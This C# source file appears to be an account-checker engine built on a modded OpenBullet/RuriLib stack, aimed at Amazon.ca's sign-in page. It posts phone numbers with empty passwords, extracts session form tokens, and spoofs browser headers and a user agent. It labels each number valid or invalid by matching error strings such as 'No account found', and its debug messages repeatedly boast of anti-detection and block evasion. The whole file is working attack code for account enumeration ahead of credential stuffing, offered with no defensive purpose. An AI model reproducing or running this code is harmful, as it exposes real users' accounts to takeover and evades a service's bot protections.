using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace OpenBullet_Console
{
    /// <summary>
    /// Complete OpenBullet RuriLib Engine that recreates the original sophisticated architecture
    /// with BotData, CProxy, captcha services, Selenium, and all anti-detection measures
    /// </summary>
    public static class CompleteRuriLibEngine
    {
        private static Assembly? ruriLibAssembly;
        private static Assembly? leafXNetAssembly;
        private static Assembly? extremeNetAssembly;
        private static Assembly? tesseractAssembly;
        private static Assembly? webDriverAssembly;
        
        // Original OpenBullet settings
        private static dynamic? rlSettings;
        private static List<dynamic> proxies = new();
        
        public static async Task<ValidationResult?> ValidateWithCompleteEngine(string phoneNumber, AmazonConfig config, bool debugMode)
        {
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🎯 ===== COMPLETE OPENBULLET RURILIB ENGINE =====");
                    Console.WriteLine("🚀 Loading ALL original sophisticated libraries...");
                    Console.WriteLine("📚 RuriLib + Leaf.xNet + Extreme.Net + Tesseract + WebDriver");
                    Console.WriteLine("🔒 Maximum anti-detection with original architecture");
                }
                
                // Step 1: Load ALL original OpenBullet assemblies
                await LoadOriginalAssemblies(debugMode);
                if (ruriLibAssembly == null)
                {
                    if (debugMode) Console.WriteLine("❌ Could not load original assemblies");
                    return null;
                }
                
                // Step 2: Load original settings from RLSettings.json
                await LoadOriginalSettings(debugMode);
                
                // Step 3: Use Leaf.xNet HttpRequest directly (bypassing WPF-dependent BotData)
                if (debugMode)
                {
                    Console.WriteLine("🔧 BYPASSING BotData due to WPF dependency");
                    Console.WriteLine("🚀 Using Leaf.xNet HttpRequest DIRECTLY for maximum anti-detection");
                    Console.WriteLine("🍪 This contains ALL the sophisticated cookie/browser simulation");
                }
                
                // Step 4: Execute with direct Leaf.xNet approach
                return await ExecuteWithDirectLeafXNet(phoneNumber, config, debugMode);
            }
            catch (Exception ex)
            {
                if (debugMode)
                {
                    Console.WriteLine($"❌ Complete engine error: {ex.Message}");
                    Console.WriteLine($"🔍 Stack: {ex.StackTrace}");
                }
                return null;
            }
        }
        
        private static async Task LoadOriginalAssemblies(bool debugMode)
        {
            try
            {
                string basePath = "/Users/BABY/Downloads/Projects/OpenBullet/Openbullet 1.4.4 Anomaly Modded Version/bin";
                
                var assemblies = new Dictionary<string, string>
                {
                    ["RuriLib"] = Path.Combine(basePath, "RuriLib.dll"),
                    ["Leaf.xNet"] = Path.Combine(basePath, "Leaf.xNet.dll"),
                    ["Extreme.Net"] = Path.Combine(basePath, "Extreme.Net.dll"),
                    ["Tesseract"] = Path.Combine(basePath, "Tesseract.dll"),
                    ["WebDriver"] = Path.Combine(basePath, "WebDriver.dll")
                };
                
                foreach (var assembly in assemblies)
                {
                    if (File.Exists(assembly.Value))
                    {
                        try
                        {
                            var asm = Assembly.LoadFrom(assembly.Value);
                            switch (assembly.Key)
                            {
                                case "RuriLib": ruriLibAssembly = asm; break;
                                case "Leaf.xNet": leafXNetAssembly = asm; break;
                                case "Extreme.Net": extremeNetAssembly = asm; break;
                                case "Tesseract": tesseractAssembly = asm; break;
                                case "WebDriver": webDriverAssembly = asm; break;
                            }
                            
                            if (debugMode)
                                Console.WriteLine($"✅ Loaded: {assembly.Key} ({asm.GetName().Version})");
                        }
                        catch (Exception ex)
                        {
                            if (debugMode)
                                Console.WriteLine($"⚠️ Failed to load {assembly.Key}: {ex.Message}");
                        }
                    }
                }
                
                if (debugMode)
                {
                    Console.WriteLine($"📚 Total assemblies loaded: {assemblies.Count}");
                    Console.WriteLine("🔒 Original OpenBullet anti-detection stack active");
                }
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Assembly loading error: {ex.Message}");
            }
        }
        
        private static async Task LoadOriginalSettings(bool debugMode)
        {
            try
            {
                string settingsPath = "/Users/BABY/Downloads/Projects/OpenBullet/Openbullet 1.4.4 Anomaly Modded Version/Settings/RLSettings.json";
                
                if (File.Exists(settingsPath))
                {
                    string settingsJson = await File.ReadAllTextAsync(settingsPath);
                    rlSettings = JsonConvert.DeserializeObject(settingsJson);
                    
                    if (debugMode)
                    {
                        Console.WriteLine("✅ Original RLSettings.json loaded");
                        Console.WriteLine($"   🕒 WaitTime: {rlSettings?.General?.WaitTime ?? 100}ms");
                        Console.WriteLine($"   ⏱️ RequestTimeout: {rlSettings?.General?.RequestTimeout ?? 10}s");
                        Console.WriteLine($"   🔄 MaxRedirects: {rlSettings?.Proxies?.BanLoopEvasion ?? 100}");
                        Console.WriteLine($"   🌐 Proxy Settings: {(rlSettings?.Proxies?.ConcurrentUse == true ? "Concurrent" : "Sequential")}");
                    }
                }
                else
                {
                    if (debugMode)
                        Console.WriteLine("⚠️ Original RLSettings.json not found, using defaults");
                }
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"⚠️ Settings loading error: {ex.Message}");
            }
        }
        
        private static async Task<dynamic?> CreateSophisticatedBotData(string phoneNumber, AmazonConfig config, bool debugMode)
        {
            try
            {
                if (ruriLibAssembly == null) return null;
                
                if (debugMode)
                {
                    Console.WriteLine("🤖 Creating sophisticated BotData with CORRECT constructor:");
                    Console.WriteLine("   📱 Phone number integration");
                    Console.WriteLine("   🌐 Proxy rotation system");
                    Console.WriteLine("   🍪 Advanced cookie management");
                    Console.WriteLine("   🔍 Captcha solving capability");
                    Console.WriteLine("   🌐 Selenium WebDriver integration");
                }
                
                // Create all required components for BotData constructor
                var globalSettings = await CreateGlobalSettings(debugMode);
                var configSettings = await CreateConfigSettings(debugMode);
                var cData = await CreateCData(phoneNumber, debugMode);
                var cProxy = await CreateCProxy(debugMode);
                var random = new Random();
                
                if (debugMode)
                {
                    Console.WriteLine("✅ All BotData constructor parameters prepared");
                    Console.WriteLine("🔧 Calling BotData constructor with 8 parameters...");
                }
                
                // Create BotData with CORRECT constructor parameters
                var botDataType = ruriLibAssembly.GetType("RuriLib.BotData");
                var botData = Activator.CreateInstance(botDataType!, new object[]
                {
                    globalSettings,    // RLSettingsViewModel globalSettings
                    configSettings,    // ConfigSettings configSettings  
                    cData,            // CData data
                    cProxy,           // CProxy proxy
                    false,            // bool useProxies (start with false, can enable later)
                    random,           // Random random
                    1,                // int botNumber = 0
                    true              // bool isDebug = true
                });
                
                if (debugMode)
                {
                    Console.WriteLine("✅ Sophisticated BotData created with ORIGINAL constructor!");
                    Console.WriteLine("🔒 All anti-detection systems integrated");
                }
                
                return botData;
            }
            catch (Exception ex)
            {
                if (debugMode)
                {
                    Console.WriteLine($"❌ BotData creation error: {ex.Message}");
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine($"💡 Inner exception: {ex.InnerException.Message}");
                        Console.WriteLine($"🔍 Inner stack: {ex.InnerException.StackTrace}");
                    }
                }
                return null;
            }
        }
        

        
        private static async Task<ValidationResult?> ExecuteWithOriginalPipeline(dynamic botData, string phoneNumber, AmazonConfig config, bool debugMode)
        {
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🚀 ===== EXECUTING WITH ORIGINAL PIPELINE =====");
                    Console.WriteLine("📋 Using EXACT original OpenBullet execution flow");
                    Console.WriteLine("🔍 Parsing LoliScript from amazonChecker.anom");
                }
                
                // Parse the amazon config script using original LoliScript parser
                var blocks = await ParseLoliScript(config.Script, debugMode);
                if (blocks == null || blocks.Count == 0)
                {
                    if (debugMode) Console.WriteLine("❌ No blocks parsed from LoliScript");
                    return null;
                }
                
                if (debugMode)
                {
                    Console.WriteLine($"✅ Parsed {blocks.Count} blocks from amazonChecker.anom");
                    foreach (var block in blocks)
                    {
                        Console.WriteLine($"   📦 Block: {GetProperty(block, "Label")} ({block.GetType().Name})");
                    }
                }
                
                // Execute each block in sequence (REQUEST -> KEYCHECK)
                foreach (var block in blocks)
                {
                    if (debugMode)
                    {
                        Console.WriteLine($"🔄 Executing block: {GetProperty(block, "Label")} ({block.GetType().Name})");
                    }
                    
                    // Call the Process method on the block
                    var processMethod = block.GetType().GetMethod("Process", new[] { botData.GetType() });
                    if (processMethod != null)
                    {
                        processMethod.Invoke(block, new[] { botData });
                        
                        if (debugMode)
                        {
                            var status = GetProperty(botData, "Status");
                            Console.WriteLine($"   📊 BotData.Status after {block.GetType().Name}: {status}");
                        }
                    }
                }
                
                // Extract final result from BotData
                var finalStatus = GetProperty(botData, "Status");
                var statusString = GetProperty(botData, "StatusString");
                var responseSource = GetProperty(botData, "ResponseSource");
                
                if (debugMode)
                {
                    Console.WriteLine("🎯 ===== ORIGINAL PIPELINE EXECUTION COMPLETED =====");
                    Console.WriteLine($"📊 Final BotData.Status: {finalStatus}");
                    Console.WriteLine($"📋 Status String: {statusString}");
                    Console.WriteLine($"📄 Response length: {responseSource?.ToString()?.Length ?? 0} characters");
                }
                
                // Convert original BotStatus to our ValidationResult
                bool isValid = statusString?.ToString()?.ToUpper() == "SUCCESS" || 
                              statusString?.ToString()?.ToUpper() == "HIT";
                
                return new ValidationResult
                {
                    PhoneNumber = phoneNumber,
                    IsValid = isValid,
                    DetectedKey = $"ORIGINAL_ENGINE: {statusString}",
                    FullMatchedText = $"Original OpenBullet result: {finalStatus}",
                    ResponseContent = responseSource?.ToString() ?? ""
                };
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Pipeline execution error: {ex.Message}");
                return null;
            }
        }
        
        private static async Task<List<dynamic>?> ParseLoliScript(string script, bool debugMode)
        {
            try
            {
                var blockParserType = ruriLibAssembly!.GetType("RuriLib.LS.BlockParser");
                var parseMethod = blockParserType!.GetMethod("Parse", new[] { typeof(string) });
                var isBlockMethod = blockParserType.GetMethod("IsBlock", new[] { typeof(string) });
                
                var blocks = new List<dynamic>();
                var lines = script.Split('\n');
                
                foreach (var line in lines)
                {
                    var trimmed = line.Trim();
                    if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith("//")) continue;
                    
                    // Check if this line is a block
                    var isBlock = (bool)isBlockMethod!.Invoke(null, new object[] { trimmed })!;
                    if (isBlock)
                    {
                        try
                        {
                            var block = parseMethod!.Invoke(null, new object[] { trimmed });
                            if (block != null)
                            {
                                blocks.Add(block);
                                if (debugMode)
                                {
                                    Console.WriteLine($"📦 Parsed block: {trimmed.Substring(0, Math.Min(50, trimmed.Length))}...");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            if (debugMode)
                                Console.WriteLine($"⚠️ Block parsing error: {ex.Message} for line: {trimmed}");
                        }
                    }
                }
                
                if (debugMode)
                {
                    Console.WriteLine($"✅ LoliScript parsing completed: {blocks.Count} blocks");
                }
                
                return blocks;
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ LoliScript parsing error: {ex.Message}");
                return null;
            }
        }
        
        private static async Task<ValidationResult?> ExecuteWithDirectLeafXNet(string phoneNumber, AmazonConfig config, bool debugMode)
        {
            try
            {
                if (debugMode)
                {
                    Console.WriteLine("🚀 ===== DIRECT LEAF.XNET EXECUTION =====");
                    Console.WriteLine("🔒 Using sophisticated anti-detection HttpRequest");
                    Console.WriteLine("🍪 Advanced cookie management active");
                }
                
                // Create sophisticated Leaf.xNet HttpRequest
                var httpRequestType = leafXNetAssembly!.GetType("Leaf.xNet.HttpRequest");
                var httpResponseType = leafXNetAssembly.GetType("Leaf.xNet.HttpResponse");
                var request = Activator.CreateInstance(httpRequestType!)!;
                
                if (debugMode)
                {
                    Console.WriteLine("✅ Leaf.xNet HttpRequest created");
                }
                
                // Configure with ORIGINAL OpenBullet anti-detection settings
                SetProperty(request, "KeepAlive", true);
                SetProperty(request, "AllowAutoRedirect", true);
                SetProperty(request, "UseCookies", true);
                SetProperty(request, "AcceptEncoding", "gzip,deflate");
                SetProperty(request, "IgnoreProtocolErrors", true);
                SetProperty(request, "EnableEncodingContent", true);
                
                // Apply original timing settings from RLSettings.json
                if (rlSettings != null)
                {
                    int requestTimeout = (int)(rlSettings?.General?.RequestTimeout ?? 10) * 1000;
                    SetProperty(request, "ReadWriteTimeout", requestTimeout);
                    SetProperty(request, "ConnectTimeout", requestTimeout);
                    
                    if (debugMode)
                    {
                        Console.WriteLine($"⏱️ Applied original timeouts: {requestTimeout}ms");
                    }
                }
                
                // Set sophisticated User-Agent with original browser simulation
                SetProperty(request, "UserAgent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                
                // Apply ALL headers from amazonChecker.anom using sophisticated AddHeader method
                var headers = GetAmazonHeadersFromConfig();
                var addHeaderMethod = httpRequestType!.GetMethod("AddHeader", new[] { typeof(string), typeof(string) });
                
                foreach (var header in headers)
                {
                    try
                    {
                        if (header.Key.ToLowerInvariant() != "host" && header.Key.ToLowerInvariant() != "content-length")
                        {
                            addHeaderMethod?.Invoke(request, new object[] { header.Key, header.Value });
                            if (debugMode)
                                Console.WriteLine($"🔧 [Leaf] Header: {header.Key}");
                        }
                    }
                    catch { /* Ignore single header issues */ }
                }
                
                string amazonUrl = config.TargetUrl ?? "https://www.amazon.ca/ap/signin";
                
                // Step 1: GET with sophisticated browser simulation
                if (debugMode) Console.WriteLine("📥 [Leaf] GET with sophisticated anti-detection...");
                var getMethod = httpRequestType.GetMethod("Get", new[] { typeof(string) });
                var getResponse = getMethod?.Invoke(request, new object[] { amazonUrl });
                
                var toStringMethod = httpResponseType!.GetMethod("ToString", Type.EmptyTypes);
                string getContent = (string)toStringMethod!.Invoke(getResponse!, Array.Empty<object>())!;
                
                if (debugMode)
                {
                    Console.WriteLine($"📄 [Leaf] GET response: {getContent.Length} characters");
                }
                
                // Step 2: POST with sophisticated form handling
                var postData = GetPostDataFromConfig(phoneNumber);
                if (string.IsNullOrEmpty(postData)) return null;
                
                if (debugMode) Console.WriteLine("📨 [Leaf] POST with anti-detection...");
                var postMethod = httpRequestType.GetMethod("Post", new[] { typeof(string), typeof(string), typeof(string) });
                var postResponse = postMethod?.Invoke(request, new object[] { amazonUrl, postData, "application/x-www-form-urlencoded" });
                string postContent = (string)toStringMethod.Invoke(postResponse!, Array.Empty<object>())!;
                
                // Step 3: Continue simulation with cookie persistence
                if (debugMode) Console.WriteLine("🚀 [Leaf] Continue with cookie persistence...");
                var continueContent = await SimulateContinueWithLeaf(request, httpRequestType, amazonUrl, postContent, phoneNumber, debugMode);
                
                // Step 4: Analyze response using original patterns
                var analysisResult = AnalyzeResponseWithOriginalPatterns(continueContent, phoneNumber, debugMode);
                
                if (debugMode)
                {
                    Console.WriteLine("✅ DIRECT LEAF.XNET EXECUTION COMPLETED!");
                    Console.WriteLine($"📊 Result: {(analysisResult.IsValid ? "VALID" : "INVALID")}");
                    Console.WriteLine($"🔑 Detection: {analysisResult.DetectedKey}");
                }
                
                return new ValidationResult
                {
                    PhoneNumber = phoneNumber,
                    IsValid = analysisResult.IsValid,
                    DetectedKey = analysisResult.DetectedKey,
                    FullMatchedText = analysisResult.FullMatchedText,
                    ResponseContent = continueContent
                };
            }
            catch (Exception ex)
            {
                if (debugMode)
                    Console.WriteLine($"❌ Direct Leaf.xNet error: {ex.Message}");
                return null;
            }
        }
        
        private static async Task<string> SimulateContinueWithLeaf(dynamic request, Type httpRequestType, string amazonUrl, string initialResponse, string phoneNumber, bool debugMode)
        {
            try
            {
                // Extract form tokens (same as before)
                var appActionToken = ExtractFormValue(initialResponse, "appActionToken") ?? "";
                var workflowState = ExtractFormValue(initialResponse, "workflowState") ?? "";
                var prevRID = ExtractFormValue(initialResponse, "prevRID") ?? "";
                
                var continueData = string.Join("&", new[]
                {
                    $"appActionToken={Uri.EscapeDataString(appActionToken)}",
                    "appAction=SIGNIN_PWD_COLLECT",
                    "subPageType=SignInClaimCollect", 
                    "openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNhLz9yZWZfPW5hdl95YV9zaWduaW4%3D",
                    $"prevRID={Uri.EscapeDataString(prevRID)}",
                    $"workflowState={Uri.EscapeDataString(workflowState)}",
                    $"email={Uri.EscapeDataString(phoneNumber)}",
                    "password=",
                    "create=0"
                });
                
                // POST with Leaf.xNet (cookies automatically preserved)
                var postMethod = httpRequestType.GetMethod("Post", new[] { typeof(string), typeof(string), typeof(string) });
                var continueResponse = postMethod?.Invoke(request, new object[] { amazonUrl, continueData, "application/x-www-form-urlencoded" });
                
                var toStringMethod = continueResponse?.GetType().GetMethod("ToString", Type.EmptyTypes);
                var html = (string)toStringMethod?.Invoke(continueResponse, Array.Empty<object>())!;
                
                if (debugMode)
                {
                    Console.WriteLine($"📨 [Leaf] Continue response: {html.Length} characters");
                    Console.WriteLine("🍪 Cookies automatically managed by Leaf.xNet");
                }
                
                return html;
            }
            catch (Exception ex)
            {
                if (debugMode) Console.WriteLine($"❌ [Leaf] Continue error: {ex.Message}");
                return "";
            }
        }
        
        private static Dictionary<string, string> GetAmazonHeadersFromConfig()
        {
            // This would be the same as Program.GetAmazonHeaders() but accessible here
            // For now, return basic headers
            return new Dictionary<string, string>
            {
                ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8",
                ["Cache-Control"] = "max-age=0",
                ["Sec-Fetch-Dest"] = "document",
                ["Sec-Fetch-Mode"] = "navigate", 
                ["Sec-Fetch-Site"] = "same-origin",
                ["Sec-Fetch-User"] = "?1",
                ["Upgrade-Insecure-Requests"] = "1"
            };
        }
        
        private static string GetPostDataFromConfig(string phoneNumber)
        {
            // Simple POST data extraction (would need to access amazonConfig.Script)
            return $"email={Uri.EscapeDataString(phoneNumber)}&password=&create=0";
        }
        
        private static (bool IsValid, string DetectedKey, string FullMatchedText) AnalyzeResponseWithOriginalPatterns(string response, string phoneNumber, bool debugMode)
        {
            // Check for blocking first
            if (response.Contains("Please Enable Cookies to Continue"))
            {
                if (debugMode) Console.WriteLine("🚨 [Leaf] Still getting blocked despite anti-detection");
                return (false, "LEAF_STILL_BLOCKED", "Even Leaf.xNet is being blocked");
            }
            
            // Check for original failure patterns
            var failurePatterns = new[] { "Incorrect phone number", "No account found", "We cannot find an account" };
            foreach (var pattern in failurePatterns)
            {
                if (response.Contains(pattern))
                {
                    if (debugMode) Console.WriteLine($"❌ [Leaf] Found failure pattern: {pattern}");
                    return (false, $"LEAF_FAILURE: {pattern}", pattern);
                }
            }
            
            if (debugMode) Console.WriteLine("✅ [Leaf] No failure patterns found - likely valid");
            return (true, "LEAF_SUCCESS", "No blocking or error patterns detected");
        }
        
        private static string? ExtractFormValue(string html, string fieldName)
        {
            try
            {
                var pattern = $@"name=""{fieldName}""[^>]*value=""([^""]*)""";
                var match = System.Text.RegularExpressions.Regex.Match(html, pattern);
                return match.Success ? match.Groups[1].Value : null;
            }
            catch { return null; }
        }
        
        #region BotData Constructor Parameter Creation
        
        private static async Task<dynamic> CreateGlobalSettings(bool debugMode)
        {
            var rlSettingsType = ruriLibAssembly!.GetType("RuriLib.ViewModels.RLSettingsViewModel");
            var globalSettings = Activator.CreateInstance(rlSettingsType!)!;
            
            // Apply original settings from RLSettings.json
            if (rlSettings != null)
            {
                var general = GetProperty(globalSettings, "General");
                SetProperty(general, "WaitTime", (int)(rlSettings?.General?.WaitTime ?? 100));
                SetProperty(general, "RequestTimeout", (int)(rlSettings?.General?.RequestTimeout ?? 10));
                SetProperty(general, "MaxHits", (int)(rlSettings?.General?.MaxHits ?? 0));
                
                var proxies = GetProperty(globalSettings, "Proxies");
                SetProperty(proxies, "ConcurrentUse", (bool)(rlSettings?.Proxies?.ConcurrentUse ?? false));
                SetProperty(proxies, "NeverBan", (bool)(rlSettings?.Proxies?.NeverBan ?? false));
                SetProperty(proxies, "BanLoopEvasion", (int)(rlSettings?.Proxies?.BanLoopEvasion ?? 100));
                SetProperty(proxies, "AlwaysGetClearance", (bool)(rlSettings?.Proxies?.AlwaysGetClearance ?? false));
            }
            
            if (debugMode)
                Console.WriteLine("✅ RLSettingsViewModel created with original parameters");
                
            return globalSettings;
        }
        
        private static async Task<dynamic> CreateConfigSettings(bool debugMode)
        {
            var configSettingsType = ruriLibAssembly!.GetType("RuriLib.ConfigSettings");
            var configSettings = Activator.CreateInstance(configSettingsType!)!;
            
            if (debugMode)
                Console.WriteLine("✅ ConfigSettings created");
                
            return configSettings;
        }
        
        private static async Task<dynamic> CreateCData(string phoneNumber, bool debugMode)
        {
            // Create WordlistType first
            var wordlistTypeType = ruriLibAssembly!.GetType("RuriLib.Models.WordlistType");
            var wordlistType = Activator.CreateInstance(wordlistTypeType!)!;
            
            // Configure for phone:password format
            SetProperty(wordlistType, "Name", "UserPass");
            SetProperty(wordlistType, "Separator", ":");
            SetProperty(wordlistType, "Verify", true);
            SetProperty(wordlistType, "Regex", "^.*:.*$");
            
            // Set slices for USER:PASS format
            var slices = new List<string> { "USER", "PASS" };
            SetProperty(wordlistType, "Slices", slices);
            
            // Now create CData with proper constructor
            var cDataType = ruriLibAssembly!.GetType("RuriLib.Models.CData");
            var cData = Activator.CreateInstance(cDataType!, new object[]
            {
                phoneNumber + ":0000",  // string data
                wordlistType            // WordlistType type
            })!;
            
            if (debugMode)
                Console.WriteLine($"✅ CData created with WordlistType: {phoneNumber}:0000");
                
            return cData;
        }
        
        private static async Task<dynamic> CreateCProxy(bool debugMode)
        {
            var cProxyType = ruriLibAssembly!.GetType("RuriLib.Models.CProxy");
            var cProxy = Activator.CreateInstance(cProxyType!)!;
            
            // Set proxy to direct connection initially
            SetProperty(cProxy, "Type", GetEnumValue(extremeNetAssembly, "Extreme.Net.ProxyType", "Http"));
            
            if (debugMode)
                Console.WriteLine("✅ CProxy created (direct connection mode)");
                
            return cProxy;
        }
        
        #endregion
        
        #region Helper Methods
        
        private static void SetProperty(object obj, string propertyName, object? value)
        {
            try
            {
                var property = obj?.GetType().GetProperty(propertyName);
                property?.SetValue(obj, value);
            }
            catch { /* Ignore property setting errors */ }
        }
        
        private static object? GetProperty(object obj, string propertyName)
        {
            try
            {
                var property = obj?.GetType().GetProperty(propertyName);
                return property?.GetValue(obj);
            }
            catch
            {
                return null;
            }
        }
        
        private static object? GetEnumValue(Assembly assembly, string enumTypeName, string valueName)
        {
            try
            {
                var enumType = assembly.GetType(enumTypeName);
                return Enum.Parse(enumType!, valueName);
            }
            catch
            {
                return null;
            }
        }
        
        #endregion
    }
}
